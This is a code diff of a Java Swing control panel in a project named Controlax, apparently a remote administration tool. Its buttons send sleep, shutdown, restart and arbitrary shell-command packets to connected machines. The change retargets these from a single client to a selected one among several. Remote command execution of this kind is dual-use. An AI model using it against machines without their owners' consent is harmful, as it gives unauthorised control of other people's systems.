@@ -61,7 +61,7 @@ public class CommandPanel extends JPanel {
 			BinaryConfigObject config = new BinaryConfigObject();
 			config.putInt("Action", 2);
 			config.putInt("SubAction", 1);
-			Controlax.INSTANCE.client.sendPacket(new BinaryConfigPacket(config));
+			Controlax.INSTANCE.selected.sendPacket(new BinaryConfigPacket(config));
 		});
 
 		systemActionPanel.add(this.sleepButton);
@@ -71,7 +71,7 @@ public class CommandPanel extends JPanel {
 			BinaryConfigObject config = new BinaryConfigObject();
 			config.putInt("Action", 2);
 			config.putInt("SubAction", 2);
-			Controlax.INSTANCE.client.sendPacket(new BinaryConfigPacket(config));
+			Controlax.INSTANCE.selected.sendPacket(new BinaryConfigPacket(config));
 		});
 
 		systemActionPanel.add(this.shutdownButton);
@@ -81,7 +81,7 @@ public class CommandPanel extends JPanel {
 			BinaryConfigObject config = new BinaryConfigObject();
 			config.putInt("Action", 2);
 			config.putInt("SubAction", 3);
-			Controlax.INSTANCE.client.sendPacket(new BinaryConfigPacket(config));
+			Controlax.INSTANCE.selected.sendPacket(new BinaryConfigPacket(config));
 		});
 
 		systemActionPanel.add(this.restartButton);
@@ -112,7 +112,7 @@ public class CommandPanel extends JPanel {
 			if(response == JOptionPane.YES_OPTION) {
 				BinaryConfigObject config = new BinaryConfigObject();
 				config.putInt("Action", -1);
-				Controlax.INSTANCE.client.sendPacket(new BinaryConfigPacket(config));
+				Controlax.INSTANCE.selected.sendPacket(new BinaryConfigPacket(config));
 			}
 		});
 
@@ -136,7 +136,7 @@ public class CommandPanel extends JPanel {
 			config.putString("Directory", directory);
 			config.putString("Command", command);
 			config.putInt("IdentifierCode", this.commandIdentifierCode);
-			Controlax.INSTANCE.client.sendPacket(new BinaryConfigPacket(config));
+			Controlax.INSTANCE.selected.sendPacket(new BinaryConfigPacket(config));
 		} catch(Throwable Errors) {
 			StringWriter stringWriter = new StringWriter();
 			PrintWriter printWriter = new PrintWriter(stringWriter);
